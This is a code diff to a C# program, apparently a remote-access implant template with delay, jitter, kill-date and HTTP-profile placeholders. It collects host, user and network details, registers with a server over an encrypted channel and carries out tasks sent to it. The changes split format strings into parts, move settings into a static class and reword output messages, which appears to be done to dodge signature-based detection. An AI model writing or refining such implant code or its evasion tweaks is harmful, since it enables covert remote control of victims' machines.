@@ -17,23 +17,29 @@ namespace antFarm
 {
     class Ant
     {
+        public static class Stringer
+        {
+            public static readonly int slow = Convert.ToInt32(@"{{REPLACE_DELAY}}");
+            public static readonly int Dyno = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
+            public static readonly int ConAttp = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
+            public static readonly DateTime StopDt = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
+            public static readonly List<string> EchoHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+            public static readonly List<string> EchoHeaderVals = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+            public static readonly List<string> EchoHTTPUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
+            public static readonly string EchoProGetResp = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
+            public static readonly string EchoProPOSTReq = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
+            public static readonly string EchoProPOSTResp = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
+            public static readonly bool ValCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
+            public static readonly bool UsePin = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
+        }
         public static void Execute(string EchoURI, string EchoCertHash, string GUID, Aes MySesK)
         {
             try
             {
-                int slow = Convert.ToInt32(@"{{REPLACE_DELAY}}");
-                int Dyno = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
-                int ConAttp = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
-                DateTime StopDt = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
-                List<string> EchoHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
-                List<string> EchoHeaderVals = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
-                List<string> EchoHTTPUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
-                string EchoProGetResp = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
-                string EchoProPOSTReq = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
-                string EchoProPOSTResp = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
-                bool ValCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
-                bool UsePin = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
-
+                int slow = Stringer.slow;
+                int Dyno = Stringer.Dyno;
+                int ConAttp = Stringer.ConAttp;
+                DateTime StopDt = Stringer.StopDt;
                 string Basename = Dns.GetHostName();
                 string IAddr = Dns.GetHostAddresses(Basename)[0].ToString();
                 foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))
@@ -62,16 +68,24 @@ namespace antFarm
                 string UDomName = Environment.UserDomainName;
                 string UName = Environment.UserName;
 
-                string RegBod = @"{ ""integrity"": " + Gritty + @", ""process"": """ + CProc + @""", ""userDomainName"": """ + UDomName + @""", ""userName"": """ + UName + @""", ""delay"": " + Convert.ToString(slow) + @", ""jitter"": " + Convert.ToString(Dyno) + @", ""connectAttempts"": " + Convert.ToString(ConAttp) + @", ""status"": 0, ""ipAddress"": """ + IAddr + @""", ""hostname"": """ + Basename + @""", ""operatingSystem"": """ + OpSys + @""" }";
+                string part3 = @"""delay"": " + Convert.ToString(slow) + @", ""jitter"": " + Convert.ToString(Dyno) + @", ";
+                string part4 = @"""connectAttempts"": " + Convert.ToString(ConAttp) + @", ""status"": 0, ";
+                string part1 = @"{ ""integrity"": " + Gritty + @", ""process"": """ + CProc + @""", ";
+                string part2 = @"""userDomainName"": """ + UDomName + @""", ""userName"": """ + UName + @""", ";
+                string part5 = @"""ipAddress"": """ + IAddr + @""", ""hostname"": """ + Basename + @""", ";
+                string part6 = @"""operatingSystem"": """ + OpSys + @""" }";
+
+                // Combine all parts into the final string
+                string RegBod = part1 + part2 + part3 + part4 + part5 + part6;
                 IMessenger bMess = null;
-                bMess = new HtpMessgr(EchoURI, EchoCertHash, UsePin, ValCert, EchoHeaderNames, EchoHeaderVals, EchoHTTPUrls);
+                bMess = new HtpMessgr(EchoURI, EchoCertHash, Stringer.UsePin, Stringer.ValCert, Stringer.EchoHeaderNames, Stringer.EchoHeaderVals, Stringer.EchoHTTPUrls);
                 bMess.Read();
                 bMess.Identifier = GUID;
                 TskMessgr mess = new TskMessgr
                 (
                     new MessCrftr(GUID, MySesK),
                     bMess,
-                    new Profl(EchoProGetResp, EchoProPOSTReq, EchoProPOSTResp)
+                    new Profl(Stringer.EchoProGetResp, Stringer.EchoProPOSTReq, Stringer.EchoProPOSTResp)
                 );
                 mess.QTskMess(RegBod);
                 mess.WTskMess();
@@ -152,8 +166,8 @@ namespace antFarm
                                 if (!Tsks.Where(T => T.Value.IsAlive).Any()) { myout += "No active tasks!"; }
                                 else
                                 {
-                                    myout += "Task       Status" + Environment.NewLine;
-                                    myout += "-++-       -++++-" + Environment.NewLine;
+                                    myout += "Work       Progress" + Environment.NewLine;
+                                    myout += "-++-       -++++++-" + Environment.NewLine;
                                     myout += String.Join(Environment.NewLine, Tsks.Where(T => T.Value.IsAlive).Select(T => T.Key + " Active").ToArray());
                                 }
                                 mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, myout).ToJson(), amess.Name);
@@ -163,7 +177,7 @@ namespace antFarm
                                 var matched = Tsks.Where(T => T.Value.IsAlive && T.Key.ToLower() == amess.Message.ToLower());
                                 if (!matched.Any())
                                 {
-                                    myout += "No active task with name: " + amess.Message;
+                                    myout += "No active work with name: " + amess.Message;
                                 }
                                 else
                                 {
@@ -174,7 +188,7 @@ namespace antFarm
                                     {
                                         t.Value.Suspend();
                                     }
-                                    myout += "Task: " + t.Key + " killed!";
+                                    myout += "Work: " + t.Key + " killed!";
                                 }
                                 mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, myout).ToJson(), amess.Name);
                             }
@@ -343,20 +357,20 @@ namespace antFarm
                 {
                     string[] split = mess.Message.Split(',');
                     bool connected = messgr.Connect(split[0], split[1]);
-                    mout += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
-                                          "Connection to " + split[0] + ":" + split[1] + " failed.";
+                    mout += connected ? "Connection to " + split[0] + ":" + split[1] + " worked!" :
+                                          "Connection to " + split[0] + ":" + split[1] + " no worky.";
                 }
                 else if (mess.Type == AntTskType.Disconnect)
                 {
                     bool disconnected = messgr.Disconnect(mess.Message);
-                    mout += disconnected ? "Disconnect succeeded!" : "Disconnect failed.";
+                    mout += disconnected ? "Discon worked!" : "Discon no worky.";
                 }
             }
             catch (Exception e)
             {
                 try
                 {
-                    AntTskMessResp response = new AntTskMessResp(AntTskStat.Completed, "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace);
+                    AntTskMessResp response = new AntTskMessResp(AntTskStat.Completed, "Work Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                     messgr.QTskMess(response.ToJson(), mess.Name);
                 }
                 catch (Exception) { }
@@ -1027,7 +1041,7 @@ namespace antFarm
         public string Message { get; set; }
         public bool Token { get; set; }
 
-        private static string AntTskMessForm = @"{{""type"":""{0}"",""name"":""{1}"",""message"":""{2}"",""token"":{3}}}";
+        private static string AntTskMessForm = @"{{""type"":""{0}"",""name"":""{1}"",""amess"":""{2}"",""token"":{3}}}";
         public static AntTskMess FromJson(string message)
         {
             List<string> parseList = Utilities.Parse(message, AntTskMessForm);
@@ -1072,7 +1086,7 @@ namespace antFarm
         public AntTskStat Status { get; set; }
         public string Output { get; set; }
 
-        private static string AntTskMEssResponseFormat = @"{{""status"":""{0}"",""output"":""{1}""}}";
+        private static string AntTskMEssResponseFormat = @"{{""status"":""{0}"",""myout"":""{1}""}}";
         public string ToJson()
         {
             return String.Format(
@@ -1112,7 +1126,15 @@ namespace antFarm
             }
         }
 
-        private static string AntEncMessForm = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
+        private static string part1 = @"{{""GUID"":""{0}"",";
+        private static string part2 = @"""Type"":{1},";
+        private static string part3 = @"""Meta"":""{2}"",";
+        private static string part4 = @"""IV"":""{3}"",";
+        private static string part5 = @"""EncryptedMessage"":""{4}"",";
+        private static string part6 = @"""HMAC"":""{5}""}}";
+
+        // Combine all parts into the final format string
+        private static string AntEncMessForm = part1 + part2 + part3 + part4 + part5 + part6;
         public static AntEncMess FromJson(string message)
         {
             List<string> parseList = Utilities.Parse(message, AntEncMessForm);
